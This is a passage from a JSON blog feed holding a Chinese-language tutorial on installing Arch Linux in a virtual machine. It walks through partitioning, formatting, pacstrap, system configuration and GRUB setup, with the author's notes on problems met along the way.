data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NDk5MDgwL2FydGljbGUvZGV0YWlscy8xMzE3MTE1MDMjOn46dGV4dD0yJUUzJTgwJTgxJUU2JTlCJUI0JUU2JTk2JUIwJUU5JTk1JTlDJUU1JTgzJThGJUU2JUJBJTkwcGFjbWFuLC1TeXkzJUUzJTgwJTgxJUU2JTlCJUI0JUU2JTk2JUIwUk9PVCVFNSVBRiU4NiVFNyVBMCU4MXBhc3N3ZDQlRTMlODAlODE=\">这篇博文</span>虚拟机默认的是 768MB，不够。在设置中修改为 2G,成功启动。<br>:::</p>\n<h1 id=\"二号坑：网络出现问题\"><a href=\"#二号坑：网络出现问题\" class=\"headerlink\" title=\"二号坑：网络出现问题\"></a>二号坑：网络出现问题</h1><p><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/network_error.png\" alt=\"Arch网络出问题\"><br>:::info<br>关了虚拟机，重新开机，成功启动<br><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/success.png\" alt=\"Arch成功启动\"><br>:::</p>\n<h1 id=\"配置控制台键盘布局和字体\"><a href=\"#配置控制台键盘布局和字体\" class=\"headerlink\" title=\"配置控制台键盘布局和字体\"></a>配置控制台键盘布局和字体</h1><p>系统启动后，控制台键盘布局默认为 us（美式键盘）。如果您需要列出所有可用的键盘布局，可以使用以下命令：</p>\n<pre><code class=\"bash\">ls /usr/share/kbd/keymaps/**/*.map.gz\n</code></pre>\n<p><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/keymaps.png\" alt=\"显示所有键盘布局\"><br>此处我使用<code>us</code>键盘布局，不修改。</p>\n<h1 id=\"检查是否连接到互联网\"><a href=\"#检查是否连接到互联网\" class=\"headerlink\" title=\"检查是否连接到互联网\"></a>检查是否连接到互联网</h1><pre><code class=\"bash\">ip link\nping archlinux.org\n</code></pre>\n<p><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/network.png\" alt=\"检查网络连接\"></p>\n<h1 id=\"更新系统时间\"><a href=\"#更新系统时间\" class=\"headerlink\" title=\"更新系统时间\"></a>更新系统时间</h1><pre><code class=\"bash\">timedatectl #查看系统时间\ntimedatectl list-timezones #查看所有时区\ntimedatectl set-timezone &quot;Asia/Shanghai&quot; # 设置为亚洲上海\n</code></pre>\n<p><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/set-timezone.png\" alt=\"设置时区\"><br>:::info<br>要创建磁盘分区了，为保证出问题后还能倒回来，此处拍摄快照 1<br>:::</p>\n<h1 id=\"创建硬盘分区\"><a href=\"#创建硬盘分区\" class=\"headerlink\" title=\"创建硬盘分区\"></a>创建硬盘分区</h1><h2 id=\"指南\"><a href=\"#指南\" class=\"headerlink\" title=\"指南\"></a>指南</h2><p>系统如果识别到计算机的内置硬盘、U 盘或者移动硬盘等类型磁盘，就会将其分配为一个块设备，如 &#x2F;dev&#x2F;sda、&#x2F;dev&#x2F;nvme0n1 或 &#x2F;dev&#x2F;mmcblk0。可以使用 lsblk 或者 fdisk 查看：</p>\n<pre><code class=\"bash\">fdisk -l(此处为小写字母l)\n</code></pre>\n<p><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/block.png\" alt=\"块设备\"><br>结果中以 rom、loop 或者 airoot 结尾的设备可以被忽略。<br>:::info<br>提示：在分区之前，请您检查 NVMe 驱动器和 Advanced Format 硬盘是否使用了最佳逻辑扇区大小。需要注意的是，更改逻辑扇区大小后，可能会导致在 Windows 系统中出现兼容性问题。<br>对于一个选定的设备，以下分区是必须要有的：</p>\n<ol>\n<li>一个根分区（挂载在 根目录）&#x2F;；</li>\n<li>要在 UEFI 模式中启动，还需要一个 EFI 系统分区。</li>\n<li>如果您需要创建多级存储例如 LVM、磁盘加密 或 RAID，请您在这时候完成。<br>请使用分区工具（fdisk 、parted、cfdisk 等等）修改分区表。例如：</li>\n</ol>\n<pre><code class=\"bash\">fdisk /dev/the_disk_to_be_partitioned（要被分区的磁盘）\n</code></pre>\n<p>注意：<br>如果您想要的磁盘没有显示出来， 确保您的磁盘控制器未处于 RAID 模式。<br>如果要启动的磁盘已经有一个 EFI 系统分区，就不要再新建 EFI 分区了，而是使用现有的 EFI 分区。<br>如果文件系统支持，交换空间 可以通过 交换文件 实现。<br>:::</p>\n<h2 id=\"分区方案：\"><a href=\"#分区方案：\" class=\"headerlink\" title=\"分区方案：\"></a>分区方案：</h2><p><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/partition.png\" alt=\"分区方案\"></p>\n<h2 id=\"分区步骤\"><a href=\"#分区步骤\" class=\"headerlink\" title=\"分区步骤\"></a>分区步骤</h2><h3 id=\"创建-GPT-分区表\"><a href=\"#创建-GPT-分区表\" class=\"headerlink\" title=\"创建 GPT 分区表\"></a>创建 GPT 分区表</h3><ol>\n<li>输入<code>fdisk /dev/sda</code>，对<code>/dev/sda</code>磁盘进行分区</li>\n<li>输入<code>g</code>，创建一个<code>GUID</code>分区表</li>\n</ol>\n<h3 id=\"创建第一个分区：EFI-分区\"><a href=\"#创建第一个分区：EFI-分区\" class=\"headerlink\" title=\"创建第一个分区：EFI 分区\"></a>创建第一个分区：EFI 分区</h3><ol>\n<li>输入<code>n</code>，创建第一个分区，输入其编号（默认为 1，即<code>/dev/sda1</code>）</li>\n<li>回车，默认其大小</li>\n<li>对最后一个扇区，输入<code>+512M</code></li>\n<li>输入<code>t</code>来将这个新分区改为”EFI System”</li>\n<li>输入<code>L</code>来查看所有分区名，输入<code>q</code>退出，可见<code>EFI System</code>分区别名为 1</li>\n<li>输入<code>1</code>，将分区改为<code>EFI System</code></li>\n</ol>\n<h3 id=\"创建第二个分区：文件系统分区\"><a href=\"#创建第二个分区：文件系统分区\" class=\"headerlink\" title=\"创建第二个分区：文件系统分区\"></a>创建第二个分区：文件系统分区</h3><ol>\n<li>输入<code>n</code>，创建第二个分区</li>\n<li>两次回车，使用默认分区号和扇区大小</li>\n<li>输入<code>-512M</code>，为交换分区留出 512MB 大小来</li>\n<li>分区默认名为<code>Linux filesystem</code>，因此不需要改</li>\n</ol>\n<h3 id=\"创建第三个分区：交换分区\"><a href=\"#创建第三个分区：交换分区\" class=\"headerlink\" title=\"创建第三个分区：交换分区\"></a>创建第三个分区：交换分区</h3><ol>\n<li>输入<code>n</code>，创建第三个分区</li>\n<li>连按 3 次回车，接受所有默认设置</li>\n<li>输入<code>t</code>，将新分区改为<code>Linux Swap</code>,别名为 19</li>\n</ol>\n<h3 id=\"查看分区结果\"><a href=\"#查看分区结果\" class=\"headerlink\" title=\"查看分区结果\"></a>查看分区结果</h3><p>输入<code>p</code></p>\n<h3 id=\"完成修改\"><a href=\"#完成修改\" class=\"headerlink\" title=\"完成修改\"></a>完成修改</h3><p>输入<code>w</code></p>\n<h1 id=\"格式化分区\"><a href=\"#格式化分区\" class=\"headerlink\" title=\"格式化分区\"></a>格式化分区</h1><p>对于不同的分区，我们使用不同的文件系统：</p>\n<h2 id=\"ESP-分区格式化：mkfs-fat格式化-FAT32-文件系统\"><a href=\"#ESP-分区格式化：mkfs-fat格式化-FAT32-文件系统\" class=\"headerlink\" title=\"ESP 分区格式化：mkfs.fat格式化 FAT32 文件系统\"></a>ESP 分区格式化：<code>mkfs.fat</code>格式化 FAT32 文件系统</h2><p>ESP 在<code>/dev/sda1</code>中，运行<code>mkfs.fat -F32 /dev/sda1</code>来挂载 FAT32 文件系统</p>\n<h2 id=\"根分区-通过mkfs-ext4格式化-ext4-文件系统\"><a href=\"#根分区-通过mkfs-ext4格式化-ext4-文件系统\" class=\"headerlink\" title=\"根分区:通过mkfs.ext4格式化 ext4 文件系统\"></a>根分区:通过<code>mkfs.ext4</code>格式化 ext4 文件系统</h2><p><code>mkfs.ext4 /dev/sad2</code></p>\n<h2 id=\"交换分区格式化：mkswap\"><a href=\"#交换分区格式化：mkswap\" class=\"headerlink\" title=\"交换分区格式化：mkswap\"></a>交换分区格式化：<code>mkswap</code></h2><p><code>mkswap /dev/sda3</code></p>\n<h1 id=\"挂载分区\"><a href=\"#挂载分区\" class=\"headerlink\" title=\"挂载分区\"></a>挂载分区</h1><h2 id=\"挂载根分区\"><a href=\"#挂载根分区\" class=\"headerlink\" title=\"挂载根分区\"></a>挂载根分区</h2><p>将根磁盘卷挂载到<code>/mnt</code>，使用命令：<code>mount /dev/sda2 /mnt</code></p>\n<h2 id=\"挂载-EFI-分区\"><a href=\"#挂载-EFI-分区\" class=\"headerlink\" title=\"挂载 EFI 分区\"></a>挂载 EFI 分区</h2><pre><code class=\"bash\">mount --mkdir /dev/sda1 /mnt/boot\n</code></pre>\n<h2 id=\"挂载-swap-分区\"><a href=\"#挂载-swap-分区\" class=\"headerlink\" title=\"挂载 swap 分区\"></a>挂载 swap 分区</h2><p><code>swapon /dev/sda3</code>来启用交换分区</p>\n<p>稍后 genfstab(8) 将自动检测挂载的文件系统和交换空间。</p>\n<h1 id=\"开始安装系统\"><a href=\"#开始安装系统\" class=\"headerlink\" title=\"开始安装系统\"></a>开始安装系统</h1><h2 id=\"选择镜像站\"><a href=\"#选择镜像站\" class=\"headerlink\" title=\"选择镜像站\"></a>选择镜像站</h2><h3 id=\"安装reflector包\"><a href=\"#安装reflector包\" class=\"headerlink\" title=\"安装reflector包\"></a>安装<code>reflector</code>包</h3><p>通常来说系统默认有，如果没有的话使用如下命令安装：<br><code>sudo pacman -S reflector</code></p>\n<h3 id=\"更新源\"><a href=\"#更新源\" class=\"headerlink\" title=\"更新源\"></a>更新源</h3><pre><code class=\"bash\">sudo reflector --country China --save /etc/pacman.d/mirrorlist.pacnew\n</code></pre>\n<p>确保源准确无误后，将<code>mirrorlist.pacnew</code>复制到<code>mirrorlist</code></p>\n<h2 id=\"安装必须的软件包\"><a href=\"#安装必须的软件包\" class=\"headerlink\" title=\"安装必须的软件包\"></a>安装必须的软件包</h2><p>使用 pacstrap(8) 脚本，安装 base 包 软件包和 Linux 内核以及常规硬件的固件：</p>\n<pre><code class=\"bash\">pacstrap -K /mnt base linux vim man-db man-pages texinfo\n</code></pre>\n<p>这时候可以同时额外安装计算机的 CPU 微码包。如果计算机是 Intel 的 CPU ，使用<code>intel-ucode</code>包，AMD CPU 则使用 <code>amd-ucode</code>包。也可以暂时都不安装，等到进入系统后再安装。<br>:::info</p>\n<ol>\n<li>因为我是在虚拟机中安装，因此我不安装固件<code>linux-firmware</code>和微码包<code>intel-ucode</code>。如果你有想补充的软件，请加在<code>pacstrap</code>后面。</li>\n<li>是<code>texinfo</code>，不是<code>textinfo</code>，不要看错啦！<br>:::<!-- ~~# 三号坑：出现`error: failed to install packages to new root`~~\n解决方案：</li>\n<li><code>pacman -S archlinux-keyring</code></li>\n<li><code>pacman-key --refresh-keys</code><br>–&gt;</li>\n</ol>\n<h1 id=\"配置系统\"><a href=\"#配置系统\" class=\"headerlink\" title=\"配置系统\"></a>配置系统</h1><h2 id=\"生成-fstab-文件\"><a href=\"#生成-fstab-文件\" class=\"headerlink\" title=\"生成 fstab 文件\"></a>生成 fstab 文件</h2><p>通过以下命令生成 fstab 文件 (用 -U 或 -L 选项设置 UUID 或卷标)：</p>\n<pre><code class=\"bash\">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab\n</code></pre>\n<p>强烈建议在执行完以上命令后，检查一下生成的<code>/mnt/etc/fstab</code>文件是否正确。</p>\n<h2 id=\"chroot-到新安装的系统\"><a href=\"#chroot-到新安装的系统\" class=\"headerlink\" title=\"chroot 到新安装的系统\"></a>chroot 到新安装的系统</h2><pre><code class=\"bash\">arch-chroot /mnt\n</code></pre>\n<p>:::info<br>提示：此处使用的是 arch-chroot 而不是直接使用 chroot，注意不要输错了。在<code>arch-chroot</code>进入<code>/mnt</code>后，提示符应该变为了<code>[root@archiso]</code>样式，如果没有，请检查一下前面的步骤是否都准确完成了。<br>:::</p>\n<h2 id=\"设置时区\"><a href=\"#设置时区\" class=\"headerlink\" title=\"设置时区\"></a>设置时区</h2><pre><code class=\"bash\">ln -sf /usr/share/zoneinfo/Region（地区名）/City（城市名） /etc/localtime\n</code></pre>\n<p>地区名填 Asia,城市名填 Shanghai<br>然后运行 hwclock(8) 以生成 &#x2F;etc&#x2F;adjtime：</p>\n<pre><code class=\"bash\">hwclock --systohc\n</code></pre>\n<p>这个命令假定已设置硬件时间为 UTC 时间。</p>\n<h2 id=\"区域和本地化设置\"><a href=\"#区域和本地化设置\" class=\"headerlink\" title=\"区域和本地化设置\"></a>区域和本地化设置</h2><ol>\n<li>编辑<code>/etc/locale.gen</code>。将<code>en_US.UTF-8</code>或其他你想要的配置，对应那行取消注释。修改后，执行<code>locale-gen</code>，以生成<code>locale信息</code>。</li>\n<li>创建<code>/etc/locale.conf</code>，在其中写入：</li>\n</ol>\n<pre><code class=\"bash\">LANG=en_US.UTF-8\n</code></pre>\n<h2 id=\"控制台键盘布局和字体设置\"><a href=\"#控制台键盘布局和字体设置\" class=\"headerlink\" title=\"控制台键盘布局和字体设置\"></a>控制台键盘布局和字体设置</h2><p>如果需要修改控制台键盘布局和字体，可编辑 &#x2F;etc&#x2F;vconsole.conf 使其长期生效，例如：</p>\n<pre><code class=\"bash\">KEYMAP=de-latin1\n</code></pre>\n<h2 id=\"网络配置\"><a href=\"#网络配置\" class=\"headerlink\" title=\"网络配置\"></a>网络配置</h2><p>:::info<br>网络配置很重要,否则安装系统后会连不上网（例如<code>VirtualBox</code>桥接模式就需要配置 DHCP）<br>:::</p>\n<h3 id=\"设置主机名\"><a href=\"#设置主机名\" class=\"headerlink\" title=\"设置主机名\"></a>设置主机名</h3><p>创建<code>/etc/hostname</code>文件，在其中直接填写你所设定的主机名，我填写的主机名是<code>arch</code></p>\n<h3 id=\"检查连接\"><a href=\"#检查连接\" class=\"headerlink\" title=\"检查连接\"></a>检查连接</h3><p>TODO</p>\n<h3 id=\"安装网络管理器\"><a href=\"#安装网络管理器\" class=\"headerlink\" title=\"安装网络管理器\"></a>安装网络管理器</h3><ol>\n<li><code>pacman -S networkmanager</code></li>\n<li><code>systemctl enable NetworkManager.service</code>设置网络管理器开机自启动</li>\n</ol>\n<h2 id=\"关于-initramfs\"><a href=\"#关于-initramfs\" class=\"headerlink\" title=\"关于 initramfs\"></a>关于 initramfs</h2><p>通常不需要自己创建新的 initramfs，因为在执行 pacstrap 时已经安装 linux 包，这时已经运行过 mkinitcpio 了。</p>\n<h2 id=\"设置-root-密码\"><a href=\"#设置-root-密码\" class=\"headerlink\" title=\"设置 root 密码\"></a>设置 root 密码</h2><p>输入<code>passwd</code>创建一个<code>root</code>密码</p>\n<h2 id=\"安装引导程序\"><a href=\"#安装引导程序\" class=\"headerlink\" title=\"安装引导程序\"></a>安装引导程序</h2><p>需要安装 Linux 引导加载程序，才能在安装后启动系统，可以使用的的引导程序已在启动加载器中列出，请选择一个安装并配置它，GRUB 是最常见的选择。<br>如果有 Intel 或 AMD 的 CPU，请另外启用微码更新。</p>\n<ol>\n<li>安装<code>grub</code>和<code>efibootmgr</code>：输入<code>pacman -S grub efibootmgr</code></li>\n<li>输入<code>grub-install --target=x86_64-efi --efi-directory=[esp] --bootloader-id=GRUB</code><br>:::info<br>我的<code>esp</code>挂载点是<code>/mnt/boot</code>，因为我已经<code>arch-chroot</code>到<code>/mnt</code>中了，因此<code>esp</code>字段填写<code>/boot</code>即可。如果你安装在了其他挂载点上，请在<code>esp</code>字段填写你自己的挂载点。如果出现问题，检查：</li>\n</ol>\n<ul>\n<li>是否已经<code>arch-chroot</code>到了<code>/mnt</code>下？命令提示符为<code>[root@archiso]</code></li>\n<li>前面的配置过程有没有出现问题？<br>:::<br><code>grub-install</code>命令成功时应该出现:<br><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/grub-install.png\" alt=\"grub-install成功\"></li>\n</ul>\n<ol start=\"3\">\n<li>生成主配置文件:<code>grub-mkconfig -o /boot/grub/grub.cfg</code><br>配置成功时界面：<br><img data-src=\"/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/configure.png\" alt=\"配置成功\"></li>\n</ol>\n<h1 id=\"重新启动计算机\"><a href=\"#重新启动计算机\" class=\"headerlink\" title=\"重新启动计算机\"></a>重新启动计算机</h1><ol>\n<li><code>exit</code>退出<code>chroot</code>环境</li>\n<li><code>umount -R /mnt</code>取消挂载<code>/mnt</code>（也等到可<code>reboot</code>时 systemd 自动卸载）</li>\n<li><code>reboot</code>重启系统</li>\n</ol>\n<h1 id=\"安装后的工作\"><a href=\"#安装后的工作\" class=\"headerlink\" title=\"安装后的工作\"></a>安装后的工作</h1><p>参见<span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpLyVFNSVCQiVCQSVFOCVBRSVBRSVFOSU5OCU4NSVFOCVBRiVCQg==\">建议阅读列表</span>及<span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpLyVFNSVCQSU5NCVFNyU5NCVBOCVFNyVBOCU4QiVFNSVCQSU4RiVFNSU4OCU5NyVFOCVBMSVBOA==\">应用程序列表</span></p>\n",
            "tags": [
                "Arch",
                "Linux",
                "安装教程",
                "操作系统",
                "notes"
            ]
        }
    ]
}